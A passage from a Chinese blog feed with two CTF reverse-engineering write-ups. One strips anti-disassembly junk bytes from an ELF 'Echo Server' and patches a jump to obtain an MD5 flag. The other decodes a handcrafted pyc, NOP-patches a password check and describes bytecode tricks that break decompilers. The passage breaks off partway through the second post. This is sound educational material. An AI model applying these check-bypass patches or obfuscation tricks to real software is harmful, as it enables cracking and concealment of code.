        <content type="html"><![CDATA[<p>这题涉及到去花和patch，难度不是很大</p><span id="more"></span><p>先file查看一下文件，32位ELF，运行一下</p><pre><code>               **************               Echo Server 0.3 ALPHA               **************</code></pre><p>等待输入，随便输入一句</p><pre><code>hhh686868</code></pre><p>直接返回了ASCII码值</p><p>用IDA打开看看</p><pre><code class="c++">int __cdecl main()&#123;  setbuf(stdin, 0);  setbuf(stdout, 0);  dword_804A088 = 1;  puts(&quot;               **************\n               Echo Server 0.3 ALPHA\n               **************&quot;);  ((void (*)(void))((char *)&amp;loc_80487C1 + 3))();  return 0;&#125;</code></pre><p><code>main</code>函数没什么特别的，就是最后这个函数调用很古怪，所以进去看看</p><pre><code class="c++">void __cdecl sub_804875D(unsigned __int8 *a1, unsigned int a2)&#123;  unsigned __int8 *v2; // eax  char v3; // zf  unsigned __int8 *v4; // [esp+18h] [ebp-10h]  unsigned int i; // [esp+1Ch] [ebp-Ch]  v4 = a1;  if ( a1 )  &#123;    for ( i = 0; i &lt; a2; ++i )    &#123;      v2 = v4++;      printf(&quot;%02X&quot;, *v2);    &#125;  &#125;  else  &#123;    printf(&quot;NULL&quot;);  &#125;  putchar(10);  JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1);  JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1);  MEMORY[0x915A4B8F]();  JUMPOUT(loc_80487C6);&#125;</code></pre><p>出现了访问内存越界的情况<code>MEMORY[0x915A4B8F]()</code>，看到上面两句更加古怪</p><pre><code class="c++">JUMPOUT(v3, (char *)&amp;loc_80487C1 + 1);JUMPOUT(!v3, (char *)&amp;loc_80487C1 + 1);</code></pre><p>这里很明显是强行创造多条分支，IDA使用递归行进算法，就会默认这条路径接这两个函数执行过后的指令是有效的而去扫描分析后面的指令，但实际上，后面是永远不会到达的指令，不管v3的值是多少，都会跳转到<code>(char *)&amp;loc_80487C1 + 1</code>这显然是一条花指令，所以查看一下汇编代码准备去花</p><pre><code class="asm">.text:0804875D ; Attributes: bp-based frame.text:0804875D.text:0804875D sub_804875D     proc near.text:0804875D.text:0804875D var_10          = dword ptr -10h.text:0804875D var_C           = dword ptr -0Ch.text:0804875D arg_0           = dword ptr  8.text:0804875D arg_4           = dword ptr  0Ch.text:0804875D.text:0804875D ; __unwind &#123;.text:0804875D                 push    ebp.text:0804875E                 mov     ebp, esp.text:08048760                 sub     esp, 28h.text:08048763                 mov     eax, [ebp+arg_0].text:08048766                 mov     [ebp+var_10], eax.text:08048769                 cmp     [ebp+arg_0], 0.text:0804876D                 jnz     short loc_804877D.text:0804876F                 mov     dword ptr [esp], offset format ; &quot;NULL&quot;.text:08048776                 call    _printf.text:0804877B                 jmp     short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j.text:0804877D                 mov     [ebp+var_C], 0.text:08048784                 jmp     short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j.text:08048786                 mov     eax, [ebp+var_10].text:08048789                 lea     edx, [eax+1].text:0804878C                 mov     [ebp+var_10], edx.text:0804878F                 movzx   eax, byte ptr [eax].text:08048792                 movzx   eax, al.text:08048795                 mov     [esp+4], eax.text:08048799                 mov     dword ptr [esp], offset a02x ; &quot;%02X&quot;.text:080487A0                 call    _printf.text:080487A5                 add     [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j.text:080487A9                 mov     eax, [ebp+var_C].text:080487AC                 cmp     eax, [ebp+arg_4].text:080487AF                 jb      short loc_8048786.text:080487B1.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j.text:080487B1                 mov     dword ptr [esp], 0Ah ; c.text:080487B8                 call    _putchar.text:080487BD                 jz      short near ptr loc_80487C1+1.text:080487BF                 jnz     short near ptr loc_80487C1+1.text:080487C1.text:080487C1 loc_80487C1:                            ; CODE XREF: sub_804875D+60↑j.text:080487C1                                         ; sub_804875D+62↑j ....text:080487C1                 call    near ptr 915A4B8Fh.text:080487C1 sub_804875D     endp ; sp-analysis failed.text:080487C1.text:080487C6.text:080487C6 loc_80487C6:                            ; DMA page register 74LS612:.text:080487C6                 in      eax, 81h        ; Channel 2 (diskette DMA)  (address bits 16-23).text:080487C8                 in      al, dx.text:080487C9                 mov     [eax], al.text:080487C9 ; ---------------------------------------------------------------------------</code></pre><p>这个函数显然是不对的，堆栈本身并没有平衡，<code>main</code>函数里跳到的地方是<code>0x080487C4</code>已经被其它指令占了，这里去花一下，多余的指令码干脆用<code>nop</code>patch掉</p><pre><code class="asm">sub_804875D     proc near.text:0804875D.text:0804875D var_10          = dword ptr -10h.text:0804875D var_C           = dword ptr -0Ch.text:0804875D arg_0           = dword ptr  8.text:0804875D arg_4           = dword ptr  0Ch.text:0804875D.text:0804875D ; __unwind &#123;.text:0804875D                 push    ebp.text:0804875E                 mov     ebp, esp.text:08048760                 sub     esp, 28h.text:08048763                 mov     eax, [ebp+arg_0].text:08048766                 mov     [ebp+var_10], eax.text:08048769                 cmp     [ebp+arg_0], 0.text:0804876D                 jnz     short loc_804877D.text:0804876F                 mov     dword ptr [esp], offset format ; &quot;NULL&quot;.text:08048776                 call    _printf.text:0804877B                 jmp     short loc_80487B1.text:0804877D ; ---------------------------------------------------------------------------.text:0804877D.text:0804877D loc_804877D:                            ; CODE XREF: sub_804875D+10↑j.text:0804877D                 mov     [ebp+var_C], 0.text:08048784                 jmp     short loc_80487A9.text:08048786 ; ---------------------------------------------------------------------------.text:08048786.text:08048786 loc_8048786:                            ; CODE XREF: sub_804875D+52↓j.text:08048786                 mov     eax, [ebp+var_10].text:08048789                 lea     edx, [eax+1].text:0804878C                 mov     [ebp+var_10], edx.text:0804878F                 movzx   eax, byte ptr [eax].text:08048792                 movzx   eax, al.text:08048795                 mov     [esp+4], eax.text:08048799                 mov     dword ptr [esp], offset a02x ; &quot;%02X&quot;.text:080487A0                 call    _printf.text:080487A5                 add     [ebp+var_C], 1.text:080487A9.text:080487A9 loc_80487A9:                            ; CODE XREF: sub_804875D+27↑j.text:080487A9                 mov     eax, [ebp+var_C].text:080487AC                 cmp     eax, [ebp+arg_4].text:080487AF                 jb      short loc_8048786.text:080487B1.text:080487B1 loc_80487B1:                            ; CODE XREF: sub_804875D+1E↑j.text:080487B1                 mov     dword ptr [esp], 0Ah ; c.text:080487B8                 call    _putchar.text:080487BD                 jz      short locret_80487C2.text:080487BF                 jnz     short locret_80487C2.text:080487C1                 nop                     ; Keypatch modified this from:.text:080487C1                                         ;   db 0E8h.text:080487C2.text:080487C2 locret_80487C2:                         ; CODE XREF: sub_804875D+60↑j.text:080487C2                                         ; sub_804875D+62↑j.text:080487C2                 leave.text:080487C3                 retn.text:080487C3 ; &#125; // starts at 804875D.text:080487C3 sub_804875D     endp</code></pre><p>这是这个函数本来的样子，而<code>main</code>函数里面调用的根本就不是这个函数，而是下面</p><pre><code class="asm">.text:080487C4 ; ---------------------------------------------------------------------------.text:080487C4 ; __unwind &#123;.text:080487C4                 push    ebp             ; CODE XREF: main+49↓p.text:080487C5                 mov     ebp, esp.text:080487C7                 sub     esp, 88h.text:080487CD                 mov     eax, large gs:14h.text:080487D3                 mov     [ebp-0Ch], eax.text:080487D6                 xor     eax, eax.text:080487D8                 mov     dword ptr [esp+8], 14h.text:080487E0                 mov     dword ptr [esp+4], 0.text:080487E8                 lea     eax, [ebp-70h].text:080487EB                 mov     [esp], eax.text:080487EE                 call    _memset.text:080487F3.text:080487F3 loc_80487F3:                            ; CODE XREF: .text:loc_80487F3↑j.text:080487F3                 jmp     short near ptr loc_80487F3+1.text:080487F3 ; ---------------------------------------------------------------------------.text:080487F5                 db 0C0h.text:080487F6                 db  48h ; H.text:080487F7                 db 0C7h</code></pre><p>下面并没有分析，因为又遇到了一个花指令</p><pre><code class="asm">.text:080487F3                 jmp     short near ptr loc_80487F3+1</code></pre><p>代码重叠，分析一下本来的指令是什么</p><pre><code class="asm">text:080487F4 ; ---------------------------------------------------------------------------.text:080487F4                 inc     eax.text:080487F6                 dec     eax.text:080487F7                 mov     dword ptr [esp+8], 14h.text:080487FF                 lea     eax, [ebp-70h].text:08048802                 mov     [esp+4], eax.text:08048806                 mov     dword ptr [esp], 0.text:0804880D                 call    _read.text:08048812                 xor     eax, eax.text:08048814                 jz      short loc_804881D.text:08048816                 jmp     near ptr 6F44B961h</code></pre><p>又来</p><pre><code class="asm">.text:08048812                 xor     eax, eax.text:08048814                 jz      short loc_804881D</code></pre><p>自己和自己异或肯定是0，这个跳转是一定会实现的，后面的语句并没有什么用但是IDA还是进行了分析然后出错，patch掉继续看</p><pre><code class="asm">.text:08048816                 nop                     ; Keypatch modified this from:.text:08048816                                         ;   db 0E9h.text:08048816 ; ---------------------------------------------------------------------------.text:08048817 aF1Ga           db &#39;F1@gA&#39;,0.text:0804881D ; ---------------------------------------------------------------------------.text:0804881D.text:0804881D loc_804881D:                            ; CODE XREF: .text:08048814↑j.text:0804881D                 mov     dword ptr [esp+8], 5.text:08048825                 mov     dword ptr [esp+4], 8048817h.text:0804882D                 lea     eax, [ebp-70h].text:08048830                 mov     [esp], eax.text:08048833                 call    _strncmp.text:08048838                 test    eax, eax.text:0804883A                 jnz     short loc_80488A3.text:0804883C                 mov     dword ptr [esp], offset aYouAreVeryClos ; &quot;You are very close! Now patch me~&quot;.text:08048843                 call    _puts.text:08048848                 mov     eax, ds:dword_804A088.text:0804884D                 test    eax, eax.text:0804884F                 jz      short loc_8048866</code></pre><p>去花之后变成了一个字符串，后面还有一个比较操作，如果输入这个字符串，就会输出<code>You are very close! Now patch me~</code></p><p>后面肯定还有操作，往后面看</p><pre><code class="asm">.text:08048848                 mov     eax, ds:dword_804A088.text:0804884D                 test    eax, eax.text:0804884F                 jz      short loc_8048866</code></pre><p>这三句很关键，如果<code>eax</code>是0，就会进行后面的跳转，所以查找一下<code>ds:dword_804A088</code>交叉引用，在<code>main</code>里面发现</p><pre><code class="asm">.text:08048913                 mov     ds:dword_804A088, 1</code></pre><p>所以这个跳转是永远不会实现的，先看看不跳转后面会执行什么</p><pre><code class="asm">.text:08048851 loc_8048851:                            ; CODE XREF: .text:08048857↓j.text:08048851                 mov     ax, 5EBh.text:08048855                 xor     eax, eax.text:08048857                 jz      short near ptr loc_8048851+1</code></pre><p>又是一个花指令，重新分析这几句</p><pre><code class="asm">.text:08048852 loc_8048852:                            ; CODE XREF: .text:08048857↓j.text:08048852                 mov     eax, 0C03105EBh.text:08048857                 jz      short loc_8048852</code></pre><p>发现进入了一个死循环，所以题目让我们patch的意思是不走这个循环，也就是真正应该执行的是前面没走的那个分支</p><pre><code class="asm">loc_8048866:                            ; CODE XREF: .text:0804884F↑j.text:08048866                 lea     eax, [ebp-70h].text:08048869                 mov     [esp], eax.text:0804886C                 call    _strlen.text:08048871                 mov     dword ptr [esp+8], 0.text:08048879                 mov     [esp+4], eax.text:0804887D                 lea     eax, [ebp-70h].text:08048880                 add     eax, 1.text:08048883                 mov     [esp], eax.text:08048886                 call    _MD5.text:0804888B                 mov     [ebp-74h], eax.text:0804888E                 mov     dword ptr [esp+4], 10h.text:08048896                 mov     eax, [ebp-74h].text:08048899                 mov     [esp], eax.text:0804889C                 call    sub_804875D.text:080488A1                 jmp     short loc_80488C0.text:080488A3 ; ---------------------------------------------------------------------------.text:080488A3.text:080488A3 loc_80488A3:                            ; CODE XREF: .text:0804883A↑j.text:080488A3                 lea     eax, [ebp-70h].text:080488A6                 mov     [esp], eax.text:080488A9                 call    _strlen.text:080488AE                 sub     eax, 1.text:080488B1                 mov     [esp+4], eax.text:080488B5                 lea     eax, [ebp-70h].text:080488B8                 mov     [esp], eax.text:080488BB                 call    sub_804875D.text:080488C0.text:080488C0 loc_80488C0:                            ; CODE XREF: .text:080488A1↑j.text:080488C0                 mov     eax, ds:stdout.text:080488C5                 mov     [esp], eax.text:080488C8                 call    _fflush.text:080488CD                 mov     eax, [ebp-0Ch].text:080488D0                 xor     eax, large gs:14h.text:080488D7                 jz      short locret_80488DE.text:080488D9                 call    ___stack_chk_fail.text:080488DE ; ---------------------------------------------------------------------------.text:080488DE.text:080488DE locret_80488DE:                         ; CODE XREF: .text:080488D7↑j.text:080488DE                 leave.text:080488DF                 retn.text:080488DF ; &#125; // starts at 80487C4</code></pre><p>执行到结束，计算了一个<code>md5</code>然后调用最开始分析的<code>sub_804875D</code>函数以16进制的形式输出，所以这里有两个选择，有linux环境可以直接patch跳转语句然后执行得到flag</p><pre><code class="bash">-&gt;./echo-server                **************               Echo Server 0.3 ALPHA               **************F1@gAYou are very close! Now patch me~F8C60EB40BF66919A77C4BD88D45DEF4</code></pre><p>当然也可以自己算<code>md5</code>，看看关键函数</p><pre><code class="asm">.text:08048866                 lea     eax, [ebp-70h].text:08048869                 mov     [esp], eax.text:0804886C                 call    _strlen.text:08048871                 mov     dword ptr [esp+8], 0.text:08048879                 mov     [esp+4], eax.text:0804887D                 lea     eax, [ebp-70h].text:08048880                 add     eax, 1.text:08048883                 mov     [esp], eax.text:08048886                 call    _MD5</code></pre><p>首先是把我们输入的字符串的地址拷贝到<code>eax</code>中，把该地址写到栈顶，调用<code>_strlen</code>，求的就是我们输入的字符串的长度，我们输入的是<code>&#39;F1@gA\n&#39;</code>，返回的值是<code>0x06</code>，储存在eax中，写到了栈顶的第二个位置（第三个位置的0并不知道什么意思，或许是第三个参数，没查到函数原型，暂时先不管了），但是栈顶元素并不是我们输入的字符串，而是首地址加1的位置，长度还是6，所以要用<code>md5</code>加密的字符串应该是<code>&#39;1@gA\x0a\x00&#39;</code>，<code>python</code>调用<code>hashlib</code>算一下</p><pre><code class="python">import hashlibm=hashlib.md5()m.update(b&#39;1@gA\x0a\x00&#39;)m.hexdigest().upper()#&#39;F8C60EB40BF66919A77C4BD88D45DEF4&#39;</code></pre><p>两种方法都可以得到flag</p><pre><code>F8C60EB40BF66919A77C4BD88D45DEF4</code></pre><p>其实这题并没有什么难度，为什么写这么长呢？</p><p><del>(实在不想写数据结构作业)</del></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>handcrafted-pyc-攻防世界</title>
      <link href="/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/16/handcrafted-pyc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<p>很早以前就想写一篇关于python的字节码的文章，但是一直没什么时间，借着刚好做到这一题，写一写我对相关内容的理解。</p><span id="more"></span><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到的题目并不是一个pyc格式的文件</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import marshal, zlib, base64exec(marshal.loads(zlib.decompress(base64.b64decode(&#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==&#39;))))</code></pre><p>通过解码之后运行，提示输入密码，将其转为pyc格式的文件</p><pre><code class="python">import marshal, zlib, base64import impb64d = base64.b64decode(&#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==&#39;)zd = zlib.decompress(b64d)ml = marshal.loads(zd)with open(&#39;crackme.pyc&#39;,&#39;wb&#39;) as f:    f.write(imp.get_magic() + b&#39;\0&#39; * 4 + zd)</code></pre><p>具体写入的内容是什么在后面介绍。</p><h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><p><em>PyCodeObject</em>定义如下</p><pre><code class="c++">typedef struct &#123;    PyObject_HEAD    int co_argcount;        /* #arguments, except *args */    int co_nlocals;     /* #local variables */    int co_stacksize;       /* #entries needed for evaluation stack */    int co_flags;       /* CO_..., see below */    PyObject *co_code;      /* instruction opcodes */    PyObject *co_consts;    /* list (constants used) */    PyObject *co_names;     /* list of strings (names used) */    PyObject *co_varnames;  /* tuple of strings (local variable names) */    PyObject *co_freevars;  /* tuple of strings (free variable names) */    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */    /* The rest doesn&#39;t count for hash/cmp */    PyObject *co_filename;  /* string (where it was loaded from) */    PyObject *co_name;      /* string (name, for reference) */    int co_firstlineno;     /* first source line number */    PyObject *co_lnotab;    /* string (encoding addr&lt;-&gt;lineno mapping) */&#125; PyCodeObject;</code></pre><p>以本题为例</p><pre><code>-&gt; hexdump -C crackme.pyc 00000000  03 f3 0d 0a 00 00 00 00  63 00 00 00 00 00 00 00  |........c.......|00000010  00 02 00 00 00 40 00 00  00 73 23 00 00 00 64 01  |.....@...s#...d.|00000020  00 84 00 00 5a 00 00 65  01 00 64 02 00 6b 02 00  |....Z..e..d..k..|00000030  72 1f 00 65 00 00 83 00  00 01 6e 00 00 64 00 00  |r..e......n..d..|00000040  53</code></pre><p>首先几个字节是文件头，首先的四个字节是 <code>MagicNumber</code> ， 接下来的四个字节是 <code>时间戳</code> ，采用<code>小端序</code>，不过写入的都是0，也无所谓，和<code>PE</code>文件格式里的时间一样，这一项实际上并没有什么用，这里对应的是之前写入的<code>imp.get_magic() + b&#39;\0&#39; * 4</code>，只有包含这样的文件头才是一个合法的<code>pyc</code>文件。</p><p>后面是 <code>PyCodeObject</code> 。首先会有一个 <code>TYPE_CODE</code> ， 这里是字符 ， 所以是 <code>C</code> ， 即<code>0x63</code> 。后面是参数个数 <code>co_argcount</code> ， 局部变量个数 <code>co_nlocals</code> ， 栈空间 <code>co_stacksize</code> ， 和 <code>co_flags</code> ，每项均占用4个字节。</p><p>我们可以解析出来这样的一个结构（需要注意是小端序）</p><pre><code>magic 03f30d0amoddate 00000000 (Thu Jan  1 08:00:00 1970)code   argcount 0   nlocals 0   stacksize 2   flags 0040   code      6401008400005a00006501006402006b0200721f00650000830000016e00      0064000053</code></pre><p><code>co_flags</code>后面是<code>co_code</code>，把它单独拿出来，因为它也有一些自己的结构</p><h5 id="co-code"><a href="#co-code" class="headerlink" title="co_code"></a>co_code</h5><p>同样先是 <code>TYPE_CODE</code> , 类型标识 ， 这里是 <code>s</code> ， 即 <code>0x73</code> 。后面的四个字节用来标识指令的 <code>长度</code> ， 这里是 <code>0x23</code> 。紧跟在后面的是具体的字节码，包含<code>指令</code>和<code>操作数</code>，有些指令是没有操作数的，指令占用一个字节，操作数占用两个字节，字节码和指令的对应关系和指令的作用可以查阅<a href="https://rycbar.xyz/2020/03/13/python-opcode/">这篇文章</a>或者直接去查阅<code>dis</code>的手册。</p><blockquote><p>给出链接</p><p><a href="https://docs.python.org/2/library/dis.html">https://docs.python.org/2/library/dis.html</a></p><p><a href="https://github.com/python/cpython/blob/master/Include/opcode.h">https://github.com/python/cpython/blob/master/Include/opcode.h</a></p></blockquote><p>用<code>dis</code>模块来解析一下这段字节码</p><pre><code>  1           0 LOAD_CONST               1 (&lt;code object main at 0000000003656E30, file &quot;&lt;string&gt;&quot;, line 1&gt;)              3 MAKE_FUNCTION            0              6 STORE_NAME               0 (main)  4           9 LOAD_NAME                1 (__name__)             12 LOAD_CONST               2 (&#39;__main__&#39;)             15 COMPARE_OP               2 (==)             18 POP_JUMP_IF_FALSE       31  5          21 LOAD_NAME                0 (main)             24 CALL_FUNCTION            0             27 POP_TOP             28 JUMP_FORWARD             0 (to 31)        &gt;&gt;   31 LOAD_CONST               0 (None)             34 RETURN_VALUE</code></pre><p>第一列数字是这个代码块在源码中的行数 ， 第二列数字表示该指令在 <code>co_code</code> 中的偏移 ， 第三列表示具体操作 ， 第四列是操作数。 </p><p>这道题目可以看出来又调用了一个<em>PyCodeObject</em>，这个在后面在分析，先关注一个问题，这个</p><p><em>PyCodeObject</em>是通过<code>LOAD_CONST</code>指令调用的，是储存在co_const中的常量</p><h5 id="co-const"><a href="#co-const" class="headerlink" title="co_const"></a>co_const</h5><p>既然单拉出来就说明它也有自己的结构</p><p>每一项都是以<code>0x28</code> 开头，为 <code>TYPE_TUPLE</code>， 即 <code>&#39;(&#39;</code> 。接下来的四个字节为元素个数，这里是<code>0x03</code>。</p><pre><code>&gt;&gt;&gt; code.co_consts(None, &lt;code object main at 0x7fa4909ea530, file &quot;&lt;string&gt;&quot;, line 1&gt;, &#39;__main__&#39;)</code></pre><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后面为<code>co_names</code>，标识<code>0x28</code>，接着四个字节为元素个数 ， 然后字符类型 ， 字符内容。</p><p><code>co_varnames</code> , <code>co_freevars</code> , <code>co_cellvars</code> 结构与上面相同。</p><p>然后是<code>co_filename</code>，标识类型，路径长度 ，路径 。</p><p>然后是<code>co_name</code>，同样是标识类型，长度，内容。</p><p><code>co_firstlineno</code>，这里为<code>0x01</code> 。</p><p>字节码指令与源文件行号对应关系储存在<code>co_lnotab</code>，同样是标识类型，四字节长度，内容。</p><p>这是文件对应的信息（<code>const</code>去掉了<code>None</code>）</p><pre><code class="names">   names (&#39;main&#39;, &#39;__name__&#39;)   varnames ()   freevars ()   cellvars ()   filename &#39;&lt;string&gt;&#39;   name &#39;&lt;module&gt;&#39;   firstlineno 1   lnotab 000009030c01</code></pre><p><code>pyc</code>文件格式的粗略解析就差不多了，可以看出来比<code>ELF</code>，<code>PE</code>都要简单得多。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>前面看到，本题还有一个<em>PyCodeObject</em> <em>main</em>是主要操作，所以用上面的方法再来解析一下<code>main</code>函数（太长了，就不全放出来了）</p><p>主要关注输入操作</p><pre><code>            737 LOAD_CONST               0 (None)            740 NOP                             741 JUMP_ABSOLUTE          759        &gt;&gt;  744 LOAD_GLOBAL              1 (raw_input)            747 JUMP_ABSOLUTE         1480        &gt;&gt;  750 LOAD_FAST                0 (password)            753 COMPARE_OP               2 (==)            756 JUMP_ABSOLUTE          767        &gt;&gt;  759 ROT_TWO                         760 STORE_FAST               0 (password)            763 POP_TOP                         764 JUMP_ABSOLUTE          744        &gt;&gt;  767 POP_JUMP_IF_FALSE     1591            770 LOAD_GLOBAL              0 (chr)            773 LOAD_CONST              17 (99)</code></pre><p>发现这里只是经过一个简单的比较，完全可以<code>bypass</code>，以16进制打开，修改<code>POP_JUMP_IF_FALSE     1591</code>成<code>nop</code>就可以了</p><p>所以开始查表<code>POP_JUMP_IF_FALSE</code>对应的值为<code>114</code>（0x72），<code>1591</code>（0x637）is <code>\x37\x06</code> （小端序）</p><p>所以要查找<code>72 37 06</code> ，<code>nop</code>对应的值为<code>09</code>，所以需要改成<code>09 09 09</code></p><p>然后直接运行，输入任何值都可以输出flag</p><pre><code class="bash">-&gt; ./crackme.pyc password: 0hitcon&#123;Now you can compile and run Python bytecode in your brain!&#125;</code></pre><p>当然也可以逐步分析</p><pre><code>        &gt;&gt;  767 POP_JUMP_IF_FALSE     1591            770 LOAD_GLOBAL              0 (chr)            773 LOAD_CONST              17 (99)            776 CALL_FUNCTION            1            779 LOAD_GLOBAL              0 (chr)            782 LOAD_CONST              10 (116)            785 CALL_FUNCTION            1            788 LOAD_GLOBAL              0 (chr)            791 LOAD_CONST              14 (105)            794 CALL_FUNCTION            1            797 LOAD_GLOBAL              0 (chr)            800 LOAD_CONST               9 (104)            803 CALL_FUNCTION            1            806 ROT_TWO            807 BINARY_ADD            808 ROT_TWO            809 BINARY_ADD            810 ROT_TWO            811 BINARY_ADD</code></pre><p>这是后面的一部分操作，分析一下，调用<code>chr()</code>函数，把存储的几个数字转成字符，此时的栈</p><pre><code>|--------high--------||--------&#39;c&#39;---------||--------&#39;t&#39;---------||--------&#39;i&#39;---------||--------&#39;h&#39;---------||--------...---------|</code></pre><p>执行一次<code>ROT_TWO</code>，栈顶两个元素换位，然后<code>BINARY_ADD</code>，经过几次，然后进行下一组</p><pre><code>|--------high--------|            |--------high--------|            |--------high--------||--------&#39;c&#39;---------|            |--------&#39;c&#39;---------|            |--------&#39;hitc&#39;------||--------&#39;t&#39;---------|            |--------&#39;t&#39;---------|            |--------...---------||--------&#39;i&#39;---------|            |--------&#39;hi&#39;--------||--------&#39;h&#39;---------|            |--------...---------||--------...---------|</code></pre><p>大概的变化过程就是这样，仔细分析，每四个字符一组，每组做一个倒序处理</p><p>然后跳转到最后</p><pre><code>        &gt;&gt; 2212 PRINT_ITEM           2213 PRINT_NEWLINE           2214 LOAD_CONST               0 (None)           2217 RETURN_VALUE</code></pre><p>直接输出，这样就得到需要的flag</p><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>从上面也可以看出来，一个不经过处理的pyc文件是没有任何安全性可言的，甚至可以被一些工具如uncompyle6或者<a href="https://tool.lu/pyc/">在线工具</a>直接反编译成python代码，并且从代码风格来看准确率还是很高的，这时候就需要掌握一些简单的混淆/反混淆的技巧</p><h5 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h5><p>这个工具还是很好用的，但是一旦报错就停止对文件的分析，而且想让uncompyle6等工具报错也很简单，只需要在开头添加一个绝对跳转就可以了，<code>JUMP_ABSOLUTE 3</code>对应的字节码为 <code>71 03 00</code>，同时修改<code>co_code</code>的长度，这个时候使用一些工具就会报错</p><pre><code class="bash">&lt;&lt;&lt; Error: Decompiling stopped due to &lt;class &#39;uncompyle6.semantics.pysource.ParserError&#39;&gt;</code></pre><p>但是<code>dis</code>还是可以正常工作的，程序也是可以正常执行的，因为我们自己加入了3个字节，然后跳转到第四个字节（编号为3）的位置，只是多了一个执行周期，对程序的执行流程没有任何影响。</p><h5 id="dis"><a href="#dis" class="headerlink" title="dis"></a>dis</h5><p>对于一些新手来说，没法使用工具就基本上束手无策了，但是对于熟练掌握汇编语言的人来说，读懂<code>dis</code>解析出来的代码太容易了，就像刚刚我们就很容易的读懂了这道题目的执行逻辑<del>（虽然很简单）</del></p><p>所以还需要一定的方法阻止破解者使用<code>dis</code>进行分析</p><p>这会需要多一些处理</p><p>给代码段头部添加 <code>0x71 0x00 0x06 0x64 0xff 0xff</code> 。 同样需要修改 co_code 的长度。</p><p>这段指令的意义很简单</p><pre><code>  0 